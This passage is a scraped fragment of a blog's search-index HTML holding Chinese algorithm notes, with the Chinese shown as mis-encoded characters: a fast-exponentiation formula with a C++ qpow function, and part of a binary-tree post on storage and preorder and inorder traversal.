style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå³ä¸€å…±9æ­¤è¿ç®—ï¼Œä»¥æ­¤ç±»æ¨ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤å¿«é€Ÿå¹‚å®é™…ä¸Šæ˜¯ä¸€ç§äºŒåˆ†çš„æ€æƒ³ï¼Œå¯ä»¥å†™å‡ºä¸€ä¸ªé€’å½’æ–¹ç¨‹ï¼Œå¯¹äº&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a^n&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.664392em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.664392em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mrow&gt;&lt;mo fence=&#34;true&#34;&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msup&gt;&lt;mo&gt;Ã—&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mfrac&gt;&lt;/msup&gt;&lt;mo&gt;Ã—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mfrac&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;mtd&gt;&lt;mstyle scriptlevel=&#34;0&#34; displaystyle=&#34;true&#34;&gt;&lt;mrow&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;/mstyle&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;/mrow&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a^n = \left \{ 
\begin{aligned}
a^{n-1} \times a, &amp;amp; \space if \space n \space is \space odd \\
a^{\frac{n}{2}} \times a^{\frac{n}{2}}, &amp;amp;  \space if  \space n \space is \space even  \space but  \space not 0 \\
1, &amp;amp; \space if \space n = 0
\end{aligned}
\right .
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7143919999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:4.581188em;vertical-align:-2.040594em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;minner&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;delimsizing mult&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.35002em;&#34;&gt;&lt;span style=&#34;top:-2.19999em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;â©&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.19999em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;âª&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1500100000000004em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;â¨&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.30001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;âª&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.60002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;delimsizinginner delim-size4&#34;&gt;&lt;span&gt;â§&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.8500199999999998em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mtable&#34;&gt;&lt;span class=&#34;col-align-r&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.540594em;&#34;&gt;&lt;span style=&#34;top:-4.676486000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.864108em;&#34;&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;Ã—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.119406em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.89708em;&#34;&gt;&lt;span style=&#34;top:-3.4130000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6915428571428572em;&#34;&gt;&lt;span style=&#34;top:-2.656em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.2255000000000003em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line mtight&#34; style=&#34;border-bottom-width:0.049em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.384em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.344em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;Ã—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.89708em;&#34;&gt;&lt;span style=&#34;top:-3.4130000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6915428571428572em;&#34;&gt;&lt;span style=&#34;top:-2.656em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.2255000000000003em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line mtight&#34; style=&#34;border-bottom-width:0.049em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.384em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.344em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-1.6194060000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.040594em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;col-align-l&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.540594em;&#34;&gt;&lt;span style=&#34;top:-4.676486000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.119406em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-1.6194060000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.040594em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;éé€’å½’å¿«é€Ÿå¹‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int qpow(int a, int n){
    int ans = 1;
    while(n){
        if(n&amp;amp;1)        //å¦‚æœnçš„å½“å‰æœ«ä½ä¸º1
            ans *= a;  //ansä¹˜ä¸Šå½“å‰çš„a
        a *= a;        //aè‡ªä¹˜
        n &amp;gt;&amp;gt;= 1;       //nå¾€å³ç§»ä¸€ä½
    }
    return ans;
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘æ•°å­¦</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-er-cha-shu/"" data-c="
          &lt;h2 id=&#34;äºŒå‰æ ‘çš„å­˜å‚¨&#34;&gt;äºŒå‰æ ‘çš„å­˜å‚¨&lt;/h2&gt;
&lt;h3 id=&#34;1-é¡ºåºå­˜å‚¨ç»“æ„&#34;&gt;1. é¡ºåºå­˜å‚¨ç»“æ„&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600843894170.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2é“¾å¼å­˜å‚¨&#34;&gt;2.é“¾å¼å­˜å‚¨&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600843945025.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;typedef struct node
{
    int data;
    struct node *lchild, *rchild;
}Bitree;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;äºŒå‰æ ‘çš„è®¿é—®&#34;&gt;äºŒå‰æ ‘çš„è®¿é—®&lt;/h2&gt;
&lt;h3 id=&#34;å…ˆåºè®¿é—®&#34;&gt;å…ˆåºè®¿é—®&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void preOrderTraveral(Bitree *node) //é€’å½’
{
    if(node == NULL)
    {
        return;
    }
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
    preOrderTraveral(node-&amp;gt;lchild);
    preOrderTraveral(node-&amp;gt;rchild);
}


void _preOrderTraveral(Bitree *node) //éé€’å½’
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL)
        {
            printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
            s.pop();
            tmp_node = tmp_node-&amp;gt;rchild;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸­åºè®¿é—®&#34;&gt;ä¸­åºè®¿é—®&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void inOrderTraveral(Bitree *node)
{
    if(node == NULL)
    {
        return;
    }
    inOrderTraveral(node-&amp;gt;lchild);
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
    inOrderTraveral(node-&amp;gt;rchild);
}


void _inOrderTraveral(Bitree *node)
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL)
        {
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
